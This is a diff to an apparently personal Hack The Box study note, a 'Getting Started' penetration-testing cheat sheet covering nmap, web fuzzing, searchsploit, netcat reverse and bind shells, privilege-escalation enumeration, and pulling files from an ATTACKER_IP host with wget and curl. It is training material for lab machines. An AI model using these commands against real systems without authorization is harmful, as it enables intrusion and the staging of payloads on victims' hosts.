@@ -1,7 +1,9 @@
 # <img src="./images/getting-started.jpg" width="36" alt="Getting Started"> Getting Started
 
-**Status:** âœ… Completed â€” 10 December 2025
+**Status:** ✅ Completed — 10 December 2025
+
 **Difficulty:** Fundamental
+
 **Tier:** 0
 
 > Practical fundamentals for approaching and attacking HTB machines.
@@ -10,74 +12,74 @@
 
 ### Common Terms
 
-* **Target** â€” Host or system being assessed.
-* **Enumeration** â€” Gathering detailed information about discovered services and attack surfaces.
-* **Exploit** â€” Technique or code that takes advantage of a vulnerability.
-* **Payload** â€” Code or data delivered through an exploit to perform an action.
-* **Foothold** â€” Initial access to a target system.
-* **Privilege Escalation** â€” Obtaining higher privileges after gaining initial access.
-* **Post-Exploitation** â€” Actions performed after gaining access, such as enumeration, credential discovery, and collecting information.
+- **Target** — Host or system being assessed.
+- **Enumeration** — Gathering detailed information about discovered services and attack surfaces.
+- **Exploit** — Technique or code that takes advantage of a vulnerability.
+- **Payload** — Code or data delivered through an exploit to perform an action.
+- **Foothold** — Initial access to a target system.
+- **Privilege Escalation** — Obtaining higher privileges after gaining initial access.
+- **Post-Exploitation** — Actions performed after gaining access, such as enumeration, credential discovery, and collecting information.
 
 ### Basic Tools
 
-| Tool            | Purpose                               |
-| --------------- | ------------------------------------- |
-| `nmap`          | Network and service enumeration       |
-| `gobuster`      | Directory/DNS enumeration             |
-| `ffuf`          | Web fuzzing                           |
-| `curl`          | HTTP requests and interaction         |
-| `wget`          | Download files                        |
-| `nc` / `netcat` | Network connections and shells        |
-| `ssh`           | Remote access                         |
-| `searchsploit`  | Search Exploit-DB for public exploits |
-| `msfconsole`    | Metasploit Framework                  |
+| Tool | Purpose |
+|---|---|
+| `nmap` | Network and service enumeration |
+| `gobuster` | Directory/DNS enumeration |
+| `ffuf` | Web fuzzing |
+| `curl` | HTTP requests and interaction |
+| `wget` | Download files |
+| `nc` / `netcat` | Network connections and shells |
+| `ssh` | Remote access |
+| `searchsploit` | Search Exploit-DB for public exploits |
+| `msfconsole` | Metasploit Framework |
 
 ### Service Scanning
 
 Identify open ports and services:
 
-```bash
+~~~bash
 nmap -sC -sV <TARGET>
-```
+~~~
 
 Scan all TCP ports:
 
-```bash
+~~~bash
 nmap -p- <TARGET>
-```
+~~~
 
 Enumerate discovered ports:
 
-```bash
+~~~bash
 nmap -p <PORTS> -sC -sV <TARGET>
-```
+~~~
 
-| Option | Purpose                   |
-| ------ | ------------------------- |
-| `-sC`  | Default NSE scripts       |
-| `-sV`  | Service/version detection |
-| `-p-`  | Scan all TCP ports        |
+| Option | Purpose |
+|---|---|
+| `-sC` | Default NSE scripts |
+| `-sV` | Service/version detection |
+| `-p-` | Scan all TCP ports |
 
 ### Web Enumeration
 
 Basic HTTP interaction:
 
-```bash
+~~~bash
 curl http://<TARGET>
 curl -I http://<TARGET>
-```
+~~~
 
 Directory enumeration:
 
-```bash
+~~~bash
 gobuster dir -u http://<TARGET> -w <WORDLIST>
-```
+~~~
 
 Web fuzzing:
 
-```bash
+~~~bash
 ffuf -u http://<TARGET>/FUZZ -w <WORDLIST>
-```
+~~~
 
 Look for hidden directories/files, login pages, technologies, versions, parameters, and exposed configuration or backup files.
 
@@ -85,10 +87,10 @@ Look for hidden directories/files, login pages, technologies, versions, paramete
 
 Search for known public exploits:
 
-```bash
+~~~bash
 searchsploit <SERVICE>
 searchsploit "<PRODUCT> <VERSION>"
-```
+~~~
 
 Verify that the exploit matches the target's product, version, and configuration before attempting to use it.
 
@@ -96,15 +98,15 @@ Verify that the exploit matches the target's product, version, and configuration
 
 Reverse shell listener:
 
-```bash
+~~~bash
 nc -lvnp <PORT>
-```
+~~~
 
 Connect to a bind shell:
 
-```bash
+~~~bash
 nc <TARGET> <PORT>
-```
+~~~
 
 Keep track of the attacker IP, target IP, listening port, shell type, and current user.
 
@@ -112,31 +114,31 @@ Keep track of the attacker IP, target IP, listening port, shell type, and curren
 
 Basic system enumeration:
 
-```bash
+~~~bash
 whoami
 id
 hostname
 uname -a
-```
+~~~
 
 Check sudo permissions:
 
-```bash
+~~~bash
 sudo -l
-```
+~~~
 
 Enumerate users and groups:
 
-```bash
+~~~bash
 cat /etc/passwd
 cat /etc/group
-```
+~~~
 
 Find SUID binaries:
 
-```bash
+~~~bash
 find / -perm -4000 -type f 2>/dev/null
-```
+~~~
 
 > **Enumerate first. Exploit second.**
 
@@ -144,25 +146,25 @@ find / -perm -4000 -type f 2>/dev/null
 
 Start a temporary HTTP server:
 
-```bash
+~~~bash
 python3 -m http.server <PORT>
-```
+~~~
 
 Download with `wget`:
 
-```bash
+~~~bash
 wget http://<ATTACKER_IP>:<PORT>/<FILE>
-```
+~~~
 
 Download with `curl`:
 
-```bash
+~~~bash
 curl http://<ATTACKER_IP>:<PORT>/<FILE> -o <FILE>
-```
+~~~
 
 ## Quick Reference
 
-```bash
+~~~bash
 # HTB VPN
 sudo openvpn user.ovpn
 
@@ -197,15 +199,14 @@ find / -perm -4000 -type f 2>/dev/null
 python3 -m http.server <PORT>
 wget http://<ATTACKER_IP>:<PORT>/<FILE>
 curl http://<ATTACKER_IP>:<PORT>/<FILE> -o <FILE>
-```
+~~~
 
 ## Related Modules
 
-* [Network Enumeration with Nmap](../network-enumeration-with-nmap/README.md)
-* [Attacking Web Applications with Ffuf](../../web/attacking-web-applications-with-ffuf/README.md)
-* [Using the Metasploit Framework](../../exploitation/using-the-metasploit-framework/README.md)
-* [Using Web Proxies](../../web/using-web-proxies/README.md)
-* [Nibbles â€” Machine Writeup](../../../easy-machines/nibbles/README.md)
+- [Network Enumeration with Nmap](../../paths/skill/basic-toolset/network-enumeration-with-nmap/README.md)
+- [Attacking Web Applications with Ffuf](../../paths/skill/basic-toolset/attacking-web-applications-with-ffuf/README.md)
+- [Using Web Proxies](../../paths/skill/basic-toolset/using-web-proxies/README.md)
+- [Nibbles — Machine Writeup](../../../easy-machines/nibbles/README.md)
 
 ## Completion
 
